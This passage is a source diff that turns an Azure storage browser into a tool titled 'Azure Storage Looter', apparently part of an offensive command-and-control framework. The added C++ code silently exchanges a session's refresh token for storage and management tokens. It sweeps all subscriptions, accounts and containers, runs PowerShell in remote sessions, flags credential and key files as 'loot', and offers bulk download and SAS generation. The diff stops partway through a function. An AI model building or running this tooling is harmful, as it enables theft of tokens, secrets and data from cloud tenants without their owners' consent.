@@ -2,7 +2,9 @@
 #include "StyleManager.h"
 #include "UserSelectorWidget.h"
 #include "TokenHelper.h"
+#include "TokenStore.h"
 #include "NetworkHelper.h"
+#include "ClientTransport.h"
 
 #include <QVBoxLayout>
 #include <QHBoxLayout>
@@ -19,125 +21,162 @@
 #include <QMessageBox>
 #include <QFileDialog>
 #include <QFile>
+#include <QDir>
+#include <QUuid>
 #include <QRegularExpression>
+#include <QUrlQuery>
+#include <QMenu>
+
+namespace {
+// Extract a JSON array/object from PowerShell output. The server pipes command output
+// through `Out-String -Width 512`, which wraps long lines - so a compact JSON blob can
+// arrive split across several lines. Stripping the inserted newlines reconstructs it
+// (ConvertTo-Json -Compress emits no real newlines, and blob/container names have none).
+QJsonArray parsePsJsonArray(const QString &out) {
+    QString s = out;
+    s.remove('\r');
+    s.remove('\n');
+    int start = -1;
+    for (int i = 0; i < s.size(); ++i) {
+        const QChar c = s.at(i);
+        if (c == '[' || c == '{') { start = i; break; }
+    }
+    if (start < 0) return {};
+    const int end = qMax(s.lastIndexOf(']'), s.lastIndexOf('}'));
+    if (end < start) return {};
+    const QJsonDocument doc = QJsonDocument::fromJson(s.mid(start, end - start + 1).toUtf8());
+    if (doc.isArray()) return doc.array();
+    QJsonArray a;
+    if (doc.isObject()) a.append(doc.object());
+    return a;
+}
+} // namespace
 
 AzureStorageWindow::AzureStorageWindow(QWidget *parent)
     : QWidget(parent), net(new QNetworkAccessManager(this))
 {
-    setWindowTitle("Azure Storage Explorer");
+    setWindowTitle("Azure Storage Looter");
     setAttribute(Qt::WA_DeleteOnClose);
     setupUi();
 }
 
 AzureStorageWindow::~AzureStorageWindow() {
-    // Disconnect ALL network replies to prevent callbacks during destruction
     if (net) {
         const auto replies = net->findChildren<QNetworkReply*>();
-        for (auto *r : replies) {
-            r->disconnect();
-            r->abort();
-        }
+        for (auto *r : replies) { r->disconnect(); r->abort(); }
     }
     activeReplies.clear();
 }
 
+// ============================================================================
+// UI
+// ============================================================================
+
 void AzureStorageWindow::setupUi() {
     auto *mainLayout = new QVBoxLayout(this);
 
-    // Token inputs
-    auto *tokenGroup = new QGroupBox("Authentication", this);
-    auto *tokenLayout = new QVBoxLayout(tokenGroup);
+    auto *authGroup = new QGroupBox("Access", this);
+    auto *authLayout = new QVBoxLayout(authGroup);
 
-    // User selector
     userSelector = new UserSelectorWidget(this);
-    tokenLayout->addWidget(userSelector);
+    authLayout->addWidget(userSelector);
     connect(userSelector, &UserSelectorWidget::userChanged, this, &AzureStorageWindow::onUserChanged);
     connect(userSelector, &UserSelectorWidget::logMessage, this, &AzureStorageWindow::appendLog);
 
-    // Auto-fetch button
-    auto *autoFetchRow = new QHBoxLayout();
-    autoFetchBtn = new QPushButton("Auto-Fetch Tokens for Selected User", this);
-    StyleManager::applyPrimaryStyle(autoFetchBtn);
-    autoFetchRow->addWidget(autoFetchBtn);
-    autoFetchRow->addStretch();
-    tokenLayout->addLayout(autoFetchRow);
-    connect(autoFetchBtn, &QPushButton::clicked, this, &AzureStorageWindow::autoFetchTokens);
+    autoFetchBtn = new QPushButton(this);
+    autoFetchBtn->setVisible(false);
 
-    auto *gridLayout = new QGridLayout();
-    gridLayout->addWidget(new QLabel("Management Token:", this), 0, 0);
-    mgmtTokenInput = new QLineEdit(this);
-    mgmtTokenInput->setPlaceholderText("Token for https://management.azure.com");
-    mgmtTokenInput->setEchoMode(QLineEdit::Password);
-    gridLayout->addWidget(mgmtTokenInput, 0, 1);
-    mgmtTokenStatus = new QLabel(this);
-    mgmtTokenStatus->setFixedWidth(80);
-    gridLayout->addWidget(mgmtTokenStatus, 0, 2);
+    // Minimal target fields - auth comes from the session's credential context
+    auto *row1 = new QHBoxLayout();
+    row1->addWidget(new QLabel("Storage account:", this));
+    accountInput = new QLineEdit(this);
+    accountInput->setPlaceholderText("filled by Enumerate All, or type e.g. tbhstoragee81305");
+    row1->addWidget(accountInput, 1);
+    row1->addWidget(new QLabel("Container:", this));
+    containerInput = new QLineEdit(this);
+    containerInput->setPlaceholderText("optional - skip listing and go straight to blobs");
+    row1->addWidget(containerInput, 1);
+    row1->addWidget(new QLabel("Service:", this));
+    serviceCombo = new QComboBox(this);
+    serviceCombo->addItems({"Blob", "File"});
+    row1->addWidget(serviceCombo);
+    authLayout->addLayout(row1);
 
-    gridLayout->addWidget(new QLabel("Storage Token:", this), 1, 0);
-    storageTokenInput = new QLineEdit(this);
-    storageTokenInput->setPlaceholderText("Token for https://storage.azure.com");
-    storageTokenInput->setEchoMode(QLineEdit::Password);
-    gridLayout->addWidget(storageTokenInput, 1, 1);
-    storageTokenStatus = new QLabel(this);
-    storageTokenStatus->setFixedWidth(80);
-    gridLayout->addWidget(storageTokenStatus, 1, 2);
+    // Hidden auth mode - always Connected Account. Other modes existed for manual use
+    // but the credential login now gives sessions a proper token cache.
+    authModeCombo = new QComboBox(this);
+    authModeCombo->addItem("Connected Account (PowerShell)");
+    authModeCombo->setVisible(false);
 
-    gridLayout->addWidget(new QLabel("Subscription ID:", this), 2, 0);
-    subscriptionInput = new QLineEdit(this);
-    subscriptionInput->setPlaceholderText("Enter subscription ID");
-    gridLayout->addWidget(subscriptionInput, 2, 1);
+    // Hidden fields (kept for compile compat with psContextSetup / dataRequest)
+    storageTokenInput = new QLineEdit(this); storageTokenInput->setVisible(false);
+    storageTokenStatus = new QLabel(this);   storageTokenStatus->setVisible(false);
+    sasInput = new QLineEdit(this);          sasInput->setVisible(false);
+    keyInput = new QLineEdit(this);          keyInput->setVisible(false);
+    credUser = new QLineEdit(this);          credUser->setVisible(false);
+    credPass = new QLineEdit(this);          credPass->setVisible(false);
+    tenantInput = new QLineEdit(this);       tenantInput->setVisible(false);
+    mgmtTokenInput = new QLineEdit(this);    mgmtTokenInput->setVisible(false);
+    mgmtTokenStatus = new QLabel(this);      mgmtTokenStatus->setVisible(false);
+    subscriptionInput = new QLineEdit(this); subscriptionInput->setVisible(false);
 
-    tokenLayout->addLayout(gridLayout);
-    mainLayout->addWidget(tokenGroup);
+    mainLayout->addWidget(authGroup);
 
-    // Progress bar
     progressBar = new QProgressBar(this);
     progressBar->setVisible(false);
     progressBar->setRange(0, 0);
     mainLayout->addWidget(progressBar);
 
-    // Storage account selection
-    auto *accountLayout = new QHBoxLayout();
+    // Action row
+    auto *actionRow = new QHBoxLayout();
+    enumerateBtn = new QPushButton("Enumerate All (Recon)", this);
+    StyleManager::applySuccessStyle(enumerateBtn);
+    actionRow->addWidget(enumerateBtn);
     listAccountsBtn = new QPushButton("List Storage Accounts", this);
     storageAccountCombo = new QComboBox(this);
-    storageAccountCombo->setMinimumWidth(300);
+    storageAccountCombo->setMinimumWidth(240);
     storageAccountCombo->setEnabled(false);
-    listContainersBtn = new QPushButton("List Containers", this);
-    listContainersBtn->setEnabled(false);
-
-    accountLayout->addWidget(listAccountsBtn);
-    accountLayout->addWidget(storageAccountCombo);
-    accountLayout->addWidget(listContainersBtn);
+    listContainersBtn = new QPushButton("List Containers / Shares", this);
+    listBlobsBtn = new QPushButton("List Blobs in Container", this);
+    StyleManager::applyPrimaryStyle(listBlobsBtn);
+    checkPublicBtn = new QPushButton("Check Public Access", this);
     cancelBtn = new QPushButton("Cancel", this);
     StyleManager::applyDangerStyle(cancelBtn);
     cancelBtn->setEnabled(false);
-    accountLayout->addWidget(cancelBtn);
-    accountLayout->addStretch();
-    mainLayout->addLayout(accountLayout);
+    actionRow->addWidget(listAccountsBtn);
+    actionRow->addWidget(storageAccountCombo);
+    actionRow->addWidget(listContainersBtn);
+    actionRow->addWidget(listBlobsBtn);
+    actionRow->addWidget(checkPublicBtn);
+    actionRow->addWidget(cancelBtn);
+    actionRow->addStretch();
+    mainLayout->addLayout(actionRow);
 
-    // Splitter for tree and log
     auto *splitter = new QSplitter(Qt::Vertical, this);
 
-    // Storage tree
     storageTree = new QTreeWidget(this);
-    storageTree->setHeaderLabels({"Name", "Type", "Size", "Last Modified"});
-    storageTree->header()->setSectionResizeMode(QHeaderView::ResizeToContents);
+    storageTree->setHeaderLabels({"Name", "Type", "Size", "Last Modified", "Notes"});
+    storageTree->header()->setSectionResizeMode(QHeaderView::Interactive);
+    storageTree->setColumnWidth(0, 340);
     storageTree->setAlternatingRowColors(true);
-    storageTree->setSelectionMode(QAbstractItemView::ExtendedSelection);  // Enable Shift+Click, Ctrl+Click
+    storageTree->setSelectionMode(QAbstractItemView::ExtendedSelection);
     splitter->addWidget(storageTree);
 
-    // Action buttons
     auto *actionWidget = new QWidget(this);
-    auto *actionLayout = new QHBoxLayout(actionWidget);
-    actionLayout->setContentsMargins(0, 0, 0, 0);
+    auto *dlLayout = new QHBoxLayout(actionWidget);
+    dlLayout->setContentsMargins(0, 0, 0, 0);
     downloadBtn = new QPushButton("Download Selected", this);
-    copyUrlBtn = new QPushButton("Copy Blob URL", this);
-    actionLayout->addWidget(downloadBtn);
-    actionLayout->addWidget(copyUrlBtn);
-    actionLayout->addStretch();
+    StyleManager::applySuccessStyle(downloadBtn);
+    bulkDownloadBtn = new QPushButton("Bulk Download to Folder", this);
+    genSasBtn = new QPushButton("Generate SAS", this);
+    copyUrlBtn = new QPushButton("Copy URL", this);
+    dlLayout->addWidget(downloadBtn);
+    dlLayout->addWidget(bulkDownloadBtn);
+    dlLayout->addWidget(genSasBtn);
+    dlLayout->addWidget(copyUrlBtn);
+    dlLayout->addStretch();
     splitter->addWidget(actionWidget);
 
-    // Log output
     logOutput = new QTextEdit(this);
     logOutput->setReadOnly(true);
     logOutput->setMaximumHeight(150);
@@ -145,453 +184,1184 @@ void AzureStorageWindow::setupUi() {
 
     mainLayout->addWidget(splitter);
 
-    // Connections
+    connect(enumerateBtn, &QPushButton::clicked, this, &AzureStorageWindow::enumerateAll);
     connect(listAccountsBtn, &QPushButton::clicked, this, &AzureStorageWindow::listStorageAccounts);
     connect(storageAccountCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
             this, &AzureStorageWindow::onStorageAccountSelected);
     connect(listContainersBtn, &QPushButton::clicked, this, &AzureStorageWindow::listContainers);
-    connect(storageTree, &QTreeWidget::itemClicked, this, &AzureStorageWindow::onContainerSelected);
-    connect(storageTree, &QTreeWidget::itemDoubleClicked, this, &AzureStorageWindow::listBlobs);
-    connect(downloadBtn, &QPushButton::clicked, this, &AzureStorageWindow::downloadBlob);
-    connect(copyUrlBtn, &QPushButton::clicked, this, &AzureStorageWindow::copyBlobUrl);
-    connect(cancelBtn, &QPushButton::clicked, this, &AzureStorageWindow::cancelRequests);
+    connect(listBlobsBtn, &QPushButton::clicked, this, &AzureStorageWindow::listKnownContainer);
+    connect(checkPublicBtn, &QPushButton::clicked, this, &AzureStorageWindow::checkPublicAccess);
+    connect(storageTree, &QTreeWidget::itemClicked, this, &AzureStorageWindow::onTreeItemClicked);
+    connect(storageTree, &QTreeWidget::itemDoubleClicked, this,
+            [this](QTreeWidgetItem *, int){ listChildren(); });
+    storageTree->setContextMenuPolicy(Qt::CustomContextMenu);
+    connect(storageTree, &QTreeWidget::customContextMenuRequested, this, [this](const QPoint &pos) {
+        QTreeWidgetItem *item = storageTree->itemAt(pos);
+        if (!item) return;
+        const QString type = item->data(0, Qt::UserRole).toString();
+        QMenu menu(this);
+        if (type == "blob") {
+            menu.addAction("Download", this, &AzureStorageWindow::downloadSelected);
+            menu.addAction("Copy URL", this, &AzureStorageWindow::copyUrl);
+        } else if (type == "container") {
+            menu.addAction("List Blobs", this, [this]() { listChildren(); });
+            menu.addAction("Check Public Access", this, &AzureStorageWindow::checkPublicAccess);
+            menu.addAction("Copy URL", this, &AzureStorageWindow::copyUrl);
+        }
+        if (!menu.isEmpty()) menu.exec(storageTree->viewport()->mapToGlobal(pos));
+    });
+    connect(downloadBtn, &QPushButton::clicked, this, &AzureStorageWindow::downloadSelected);
+    connect(bulkDownloadBtn, &QPushButton::clicked, this, &AzureStorageWindow::bulkDownloadSelected);
+    connect(genSasBtn, &QPushButton::clicked, this, &AzureStorageWindow::generateSas);
+    connect(copyUrlBtn, &QPushButton::clicked, this, &AzureStorageWindow::copyUrl);
 
-    resize(900, 600);
+    onAuthModeChanged();
+    resize(1000, 680);
 }
 
-QNetworkRequest AzureStorageWindow::armRequest(const QString &url, const QString &token) {
-    return NetworkHelper::createBearerRequest(url, token);
+void AzureStorageWindow::onAuthModeChanged() {}
+
+bool AzureStorageWindow::hasStorageToken() const {
+    return !storageTokenInput->text().trimmed().isEmpty();
 }
 
-QNetworkRequest AzureStorageWindow::storageRequest(const QString &url, const QString &token) {
-    QNetworkRequest req = NetworkHelper::createBearerRequest(url, token);
+void AzureStorageWindow::acquireStorageToken(std::function<void(bool)> then) {
+    if (hasStorageToken()) { if (then) then(true); return; }
+
+    const QString sid = userSelector->selectedSession();
+    if (sid.isEmpty()) {
+        appendLog("[-] No session selected", "red");
+        if (then) then(false);
+        return;
+    }
+
+    // Find a refresh token for this session (any resource - refresh tokens are cross-resource)
+    TokenInfo tok = TokenStore::instance()->getTokenForSession(sid);
+    if (tok.refreshToken.isEmpty()) {
+        const auto all = TokenStore::instance()->getAllTokensForSession(sid);
+        for (const TokenInfo &t : all) {
+            if (!t.refreshToken.isEmpty()) { tok = t; break; }
+        }
+    }
+    if (tok.refreshToken.isEmpty()) {
+        appendLog("[!] No refresh token for this session - storage REST unavailable", "yellow");
+        if (then) then(false);
+        return;
+    }
+
+    const QString tenant = tok.tenantId.isEmpty() ? QStringLiteral("organizations") : tok.tenantId;
+    appendLog("[*] Exchanging refresh token for storage access...", "cyan");
+
+    QUrl url(QString("https://login.microsoftonline.com/%1/oauth2/v2.0/token").arg(tenant));
+    QNetworkRequest req(url);
+    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
+    QUrlQuery form;
+    form.addQueryItem("client_id", QStringLiteral("1950a258-227b-4e31-a9cf-717495945fc2"));
+    form.addQueryItem("grant_type", "refresh_token");
+    form.addQueryItem("refresh_token", tok.refreshToken);
+    form.addQueryItem("scope", "https://storage.azure.com/.default");
+
+    QNetworkReply *reply = track(net->post(req, form.query(QUrl::FullyEncoded).toUtf8()));
+    if (!reply) { appendLog("[-] Failed to send token request", "red"); if (then) then(false); return; }
+
+    connect(reply, &QNetworkReply::finished, this, [this, reply, sid, tok, then]() {
+        reply->deleteLater();
+        activeReplies.removeOne(reply);
+        if (reply->error() != QNetworkReply::NoError) {
+            appendLog(QString("[-] Storage token exchange failed: %1").arg(reply->errorString()), "red");
+            if (then) then(false);
+            return;
+        }
+        const QJsonObject obj = QJsonDocument::fromJson(reply->readAll()).object();
+        const QString at = obj.value("access_token").toString();
+        if (at.isEmpty()) {
+            const QString err = obj.value("error_description").toString(obj.value("error").toString("unknown"));
+            appendLog(QString("[-] Storage token exchange error: %1").arg(err), "red");
+            if (then) then(false);
+            return;
+        }
+        storageTokenInput->setText(at);
+        TokenInfo stInfo;
+        stInfo.accessToken = at;
+        stInfo.upn = tok.upn;
+        stInfo.tenantId = tok.tenantId;
+        stInfo.resource = QStringLiteral("https://storage.azure.com");
+        TokenStore::instance()->storeToken(sid, stInfo);
+        appendLog("[+] Storage token acquired - REST path enabled", "lime");
+        if (then) then(true);
+    });
+}
+
+// ============================================================================
+// Helpers
+// ============================================================================
+
+void AzureStorageWindow::appendLog(const QString &msg, const QString &color) {
+    logOutput->append(QString("<span style='color:%1'>%2</span>").arg(color, msg.toHtmlEscaped()));
+}
+
+QString AzureStorageWindow::humanSize(qint64 bytes) {
+    if (bytes < 1024) return QString("%1 B").arg(bytes);
+    if (bytes < 1024 * 1024) return QString("%1 KB").arg(bytes / 1024.0, 0, 'f', 1);
+    if (bytes < 1024LL * 1024 * 1024) return QString("%1 MB").arg(bytes / (1024.0 * 1024.0), 0, 'f', 1);
+    return QString("%1 GB").arg(bytes / (1024.0 * 1024.0 * 1024.0), 0, 'f', 2);
+}
+
+bool AzureStorageWindow::isLootName(const QString &name) {
+    const QString n = name.toLower();
+    static const QStringList exts = {
+        ".pfx",".pem",".key",".p12",".ppk",".env",".bak",".sql",".config",".tfstate",
+        ".kdbx",".ovpn",".rdp",".crt",".cer",".jks",".keytab"
+    };
+    for (const QString &e : exts) if (n.endsWith(e)) return true;
+    static const QStringList subs = {
+        "secret","password","passwd","cred","credential","backup","dump","unattend",
+        "web.config","appsettings","id_rsa","authorized_keys","connectionstring",".git-credentials"
+    };
+    for (const QString &s : subs) if (n.contains(s)) return true;
+    return false;
+}
+
+QString AzureStorageWindow::accountForItem(QTreeWidgetItem *item) const {
+    // In the Enumerate-All tree the account is an ancestor node; otherwise use the field.
+    for (QTreeWidgetItem *p = item; p; p = p->parent())
+        if (p->data(0, Qt::UserRole).toString() == "account") return p->text(0);
+    return accountInput->text().trimmed();
+}
+
+QString AzureStorageWindow::accountHost() const {
+    return accountHostFor(currentStorageAccount);
+}
+
+QString AzureStorageWindow::accountHostFor(const QString &acct) const {
+    const QString svc = serviceCombo->currentText().startsWith("File") ? "file" : "blob";
+    return QString("https://%1.%2.core.windows.net").arg(acct, svc);
+}
+
+QNetworkRequest AzureStorageWindow::dataRequest(const QString &url, bool anonymous) {
+    QNetworkRequest req;
+    if (anonymous)
+        req = QNetworkRequest(QUrl(url));
+    else
+        req = NetworkHelper::createBearerRequest(url, storageTokenInput->text().trimmed());
     req.setRawHeader("x-ms-version", "2020-10-02");
+    NetworkHelper::setRequestTimeout(req);
     return req;
 }
 
-void AzureStorageWindow::appendLog(const QString &msg, const QString &color) {
-    logOutput->append(QString("<span style='color:%1'>%2</span>").arg(color, msg));
+QNetworkReply *AzureStorageWindow::track(QNetworkReply *reply) {
+    if (reply) activeReplies.append(reply);
+    return reply;
+}
+
+// ============================================================================
+// PowerShell fallback (runs in the selected session)
+// ============================================================================
+
+QObject *AzureStorageWindow::locateTransport() const {
+    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
+    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
+    return nullptr;
+}
+
+bool AzureStorageWindow::psAvailable() const {
+    return locateTransport() != nullptr && !userSelector->selectedSession().isEmpty();
+}
+
+void AzureStorageWindow::runPs(const QString &script, std::function<void(bool, const QString &)> cb) {
+    QObject *t = locateTransport();
+    const QString sid = userSelector->selectedSession();
+    if (!t || sid.isEmpty()) {
+        cb(false, "No active session for the PowerShell path. Select a session that is logged in (Connect-AzAccount).");
+        return;
+    }
+    auto *typed = qobject_cast<ClientTransport*>(t);
+    if (!typed) { cb(false, "Transport unavailable."); return; }
+
+    const QString cmdId = QUuid::createUuid().toString(QUuid::WithoutBraces);
+    auto acc = std::make_shared<QString>();
+    auto conn = std::make_shared<QMetaObject::Connection>();
+    *conn = connect(typed, &ClientTransport::messageReceived, this,
+        [this, cmdId, acc, conn, cb](const QJsonObject &obj) {
+            if (obj.value("cmdId").toString() != cmdId) return;
+            const QString act = obj.value("action").toString();
+            if (act == QLatin1String("output")) {
+                acc->append(obj.value("data").toString());
+                acc->append('\n');
+            } else if (act == QLatin1String("command_complete")) {
+                QObject::disconnect(*conn);
+                cb(obj.value("ok").toBool(true), *acc);
+            }
+        });
+
+    QJsonObject req;
+    req.insert("action", "run_command");
+    req.insert("sessionId", sid);
+    req.insert("command", script);
+    req.insert("cmdId", cmdId);
+    typed->sendJson(req);
+    appendLog(QString("[*] PowerShell: %1").arg(script.left(120)), "gray");
+}
+
+QString AzureStorageWindow::psContextSetup() const {
+    return QString("$ctx=New-AzStorageContext -StorageAccountName '%1' -UseConnectedAccount").arg(currentStorageAccount);
+}
+
+// ============================================================================
+// Account discovery (optional ARM)
+// ============================================================================
+
+void AzureStorageWindow::acquireManagementToken(std::function<void(const QString &)> then) {
+    // Cheap path: already have one typed in the (hidden) mgmt token field.
+    const QString typed = mgmtTokenInput->text().trimmed();
+    if (!typed.isEmpty()) { then(typed); return; }
+
+    // Already exchanged for this session earlier?
+    const QString existing = userSelector
+        ? userSelector->getExistingToken(QStringLiteral("https://management.azure.com"))
+        : QString();
+    if (!existing.isEmpty()) {
+        mgmtTokenInput->setText(existing);
+        then(existing);
+        return;
+    }
+
+    // Silent refresh-token exchange. Stored back under the same sessionId so
+    // other modules + the terminal pick it up too.
+    if (!userSelector || !userSelector->hasSelection()) { then(QString()); return; }
+    appendLog("[*] Fetching Management token for selected session...", "cyan");
+    userSelector->fetchToken(QStringLiteral("https://management.azure.com"),
+        [this, then](bool ok, const QString &tok, const QString &err) {
+            if (!ok) {
+                appendLog(QString("[-] Management token unavailable (falling back to PowerShell): %1").arg(err), "yellow");
+                then(QString());
+                return;
+            }
+            mgmtTokenInput->setText(tok);
+            appendLog("[+] Management token acquired.", "lime");
+            then(tok);
+        });
 }
 
 void AzureStorageWindow::listStorageAccounts() {
-    QString token = mgmtTokenInput->text().trimmed();
-    QString subId = subscriptionInput->text().trimmed();
-
-    if (token.isEmpty() || subId.isEmpty()) {
-        QMessageBox::warning(this, "Missing Input", "Please enter management token and subscription ID.");
-        return;
-    }
-
-    appendLog("[*] Listing storage accounts...", "cyan");
+    // FAST PATH: ARM over HTTP. Auto-fetches a Management token from the selected
+    // session (silent refresh-token exchange) so no manual input needed. Falls
+    // back to Get-AzStorageAccount via the terminal only when ARM is unavailable,
+    // because the PS round-trip is much slower.
     storageAccountCombo->clear();
-    storageTree->clear();
-    storageAccounts = QJsonArray();
-
-    QString url = QString("https://management.azure.com/subscriptions/%1/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01")
-                      .arg(subId);
-
-    QNetworkReply *reply = net->get(armRequest(url, token));
-    if (!reply) {
-        appendLog("[-] Failed to create network request", "red");
-        return;
-    }
-
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
-        reply->deleteLater();
-
-        QString errorMsg;
-        if (!NetworkHelper::isReplySuccess(reply, &errorMsg)) {
-            appendLog(QString("[-] Error: %1").arg(NetworkHelper::parseApiError(reply)), "red");
+    setLoading(true);
+    acquireManagementToken([this](const QString &mgmt) {
+        if (!mgmt.isEmpty()) { listStorageAccountsArm(mgmt); return; }
+        // Fallback: PowerShell (slow, but works with just a live Az context).
+        if (!psAvailable()) {
+            setLoading(false);
+            QMessageBox::information(this, "Select a logged-in session",
+                "Storage discovery needs either a Management token (auto-fetched from "
+                "the selected session's refresh token) or an active PowerShell session "
+                "with Connect-AzAccount. Select a session first.");
             return;
         }
+        appendLog("[*] Falling back to Get-AzStorageAccount via terminal...", "yellow");
+        const QString script =
+            "Get-AzStorageAccount | Select-Object StorageAccountName,ResourceGroupName,PrimaryLocation,SkuName,Kind "
+            "| ConvertTo-Json -Compress";
+        runPs(script, [this](bool ok, const QString &out) {
+            setLoading(false);
+            if (!ok) { appendLog("[-] Get-AzStorageAccount failed:", "red"); appendLog(out.trimmed(), "gray"); return; }
+            const QJsonArray arr = parsePsJsonArray(out);
+            for (const QJsonValue &v : arr) {
+                const QJsonObject a = v.toObject();
+                const QString name = a.value("StorageAccountName").toString();
+                if (name.isEmpty()) continue;
+                storageAccountCombo->addItem(
+                    QString("%1  (%2, %3)").arg(name, a.value("ResourceGroupName").toString(),
+                                                a.value("PrimaryLocation").toString()),
+                    name);
+            }
+            storageAccountCombo->setEnabled(storageAccountCombo->count() > 0);
+            appendLog(storageAccountCombo->count()
+                          ? QString("[+] Found %1 storage account(s)").arg(storageAccountCombo->count())
+                          : QStringLiteral("[!] No storage accounts visible to this account."),
+                      storageAccountCombo->count() ? "green" : "yellow");
+            if (storageAccountCombo->count()) onStorageAccountSelected(0);
+        });
+    });
+}
 
-        QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
-        QJsonArray accounts = doc.object().value("value").toArray();
-        storageAccounts = accounts;
+void AzureStorageWindow::listStorageAccountsArm(const QString &mgmtToken) {
+    // Fan out over every accessible subscription; a Management token doesn't
+    // encode which subs a principal can see, so we list subs first, then
+    // storage accounts per sub in parallel. Faster than a single PS cmdlet.
+    appendLog("[*] Listing storage accounts via ARM (auto-fetched Management token)...", "cyan");
 
-        if (accounts.isEmpty()) {
-            appendLog("[!] No storage accounts found.", "yellow");
+    QNetworkReply *subsReply = track(net->get(NetworkHelper::createBearerRequest(
+        QStringLiteral("https://management.azure.com/subscriptions?api-version=2020-01-01"), mgmtToken)));
+    if (!subsReply) { appendLog("[-] Failed to create request", "red"); setLoading(false); return; }
+
+    connect(subsReply, &QNetworkReply::finished, this, [this, subsReply, mgmtToken]() {
+        subsReply->deleteLater();
+        activeReplies.removeOne(subsReply);
+        if (!NetworkHelper::isReplySuccess(subsReply)) {
+            setLoading(false);
+            appendLog(QString("[-] Subscriptions call failed: %1").arg(NetworkHelper::parseApiError(subsReply)), "red");
             return;
         }
+        const QJsonArray subs = QJsonDocument::fromJson(subsReply->readAll()).object().value("value").toArray();
+        if (subs.isEmpty()) { setLoading(false); appendLog("[!] No subscriptions visible.", "yellow"); return; }
 
-        appendLog(QString("[+] Found %1 storage account(s)").arg(accounts.size()), "green");
+        auto pending = std::make_shared<int>(subs.size());
+        auto aggregated = std::make_shared<QJsonArray>();
+        for (const QJsonValue &sv : subs) {
+            const QString subId   = sv.toObject().value("subscriptionId").toString();
+            const QString subName = sv.toObject().value("displayName").toString();
+            if (subId.isEmpty()) { if (--(*pending) <= 0) {/*fall-through below*/} continue; }
 
-        for (const QJsonValue &val : accounts) {
-            QJsonObject acc = val.toObject();
-            QString name = acc.value("name").toString();
-            QString location = acc.value("location").toString();
-            QString kind = acc.value("kind").toString();
-
-            storageAccountCombo->addItem(QString("%1 (%2, %3)").arg(name, location, kind), name);
+            const QString url = QString("https://management.azure.com/subscriptions/%1/providers/"
+                                        "Microsoft.Storage/storageAccounts?api-version=2021-09-01").arg(subId);
+            QNetworkReply *r = track(net->get(NetworkHelper::createBearerRequest(url, mgmtToken)));
+            if (!r) { if (--(*pending) <= 0) {} continue; }
+            connect(r, &QNetworkReply::finished, this,
+                    [this, r, subName, pending, aggregated]() {
+                r->deleteLater();
+                activeReplies.removeOne(r);
+                if (NetworkHelper::isReplySuccess(r)) {
+                    const QJsonArray arr = QJsonDocument::fromJson(r->readAll()).object().value("value").toArray();
+                    for (const QJsonValue &v : arr) {
+                        QJsonObject a = v.toObject();
+                        a.insert("__sub", subName);
+                        aggregated->append(a);
+                    }
+                }
+                if (--(*pending) <= 0) {
+                    setLoading(false);
+                    storageAccounts = *aggregated;
+                    if (aggregated->isEmpty()) { appendLog("[!] No storage accounts found.", "yellow"); return; }
+                    appendLog(QString("[+] Found %1 storage account(s) across all subscriptions").arg(aggregated->size()), "green");
+                    for (const QJsonValue &v : *aggregated) {
+                        const QJsonObject a = v.toObject();
+                        storageAccountCombo->addItem(
+                            QString("%1  (%2, %3)").arg(a.value("name").toString(),
+                                                        a.value("location").toString(),
+                                                        a.value("__sub").toString()),
+                            a.value("name").toString());
+                    }
+                    storageAccountCombo->setEnabled(true);
+                    onStorageAccountSelected(0);
+                }
+            });
         }
-
-        storageAccountCombo->setEnabled(true);
-        listContainersBtn->setEnabled(true);
-        onStorageAccountSelected(0);
     });
 }
 
 void AzureStorageWindow::onStorageAccountSelected(int index) {
     if (index >= 0 && index < storageAccountCombo->count()) {
-        currentStorageAccount = storageAccountCombo->itemData(index).toString();
+        const QString name = storageAccountCombo->itemData(index).toString();
+        if (!name.isEmpty()) accountInput->setText(name);
+    }
+}
+
+// ============================================================================
+// List containers / shares
+// ============================================================================
+
+void AzureStorageWindow::enumerateAll() {
+    if (!userSelector || !userSelector->hasSelection()) {
+        QMessageBox::information(this, "Select a session",
+            "Enumeration needs a session. Select one first.");
+        return;
+    }
+    storageTree->clear();
+    setLoading(true);
+
+    // FAST PATH: ARM over HTTP for accounts + containers, then a storage-token
+    // REST call per container for blobs. Falls back to the Az PowerShell path
+    // only if a Management token can't be obtained (much slower - many PS
+    // round-trips).
+    acquireManagementToken([this](const QString &mgmt) {
+        if (!mgmt.isEmpty()) {
+            // Kick the storage-token exchange in parallel so blob listing has
+            // it ready by the time containers land.
+            if (!hasStorageToken()) acquireStorageToken(nullptr);
+            enumerateAllArm(mgmt);
+            return;
+        }
+        if (!psAvailable()) {
+            setLoading(false);
+            appendLog("[-] Can't obtain a Management token and no active PS session either.", "red");
+            return;
+        }
+        appendLog("[!] Management token unavailable - using slower PowerShell path.", "yellow");
+        enumerateAllPsLegacy();
+    });
+}
+
+void AzureStorageWindow::enumerateAllArm(const QString &mgmtToken) {
+    appendLog("[*] Enumerating storage via ARM (Management token)...", "cyan");
+
+    QNetworkReply *subsReply = track(net->get(NetworkHelper::createBearerRequest(
+        QStringLiteral("https://management.azure.com/subscriptions?api-version=2020-01-01"), mgmtToken)));
+    if (!subsReply) { setLoading(false); appendLog("[-] Failed to create request", "red"); return; }
+
+    connect(subsReply, &QNetworkReply::finished, this, [this, subsReply, mgmtToken]() {
+        subsReply->deleteLater();
+        activeReplies.removeOne(subsReply);
+        if (!NetworkHelper::isReplySuccess(subsReply)) {
+            setLoading(false);
+            appendLog(QString("[-] Subscriptions call failed: %1").arg(NetworkHelper::parseApiError(subsReply)), "red");
+            return;
+        }
+        const QJsonArray subs = QJsonDocument::fromJson(subsReply->readAll()).object().value("value").toArray();
+        if (subs.isEmpty()) { setLoading(false); appendLog("[!] No subscriptions visible.", "yellow"); return; }
+
+        // Two-phase: list every storage account across all subs (parallel),
+        // then list containers for every account (parallel). Everything is
+        // rendered into the tree as it arrives; a shared counter fires the
+        // blob-listing phase when both dimensions are complete.
+        auto accountsPending   = std::make_shared<int>(subs.size());
+        auto containersPending = std::make_shared<int>(0);
+        auto contItems         = std::make_shared<QMap<QString, QTreeWidgetItem*>>();
+        auto accItems          = std::make_shared<QMap<QString, QTreeWidgetItem*>>();
+        auto contCount         = std::make_shared<int>(0);
+
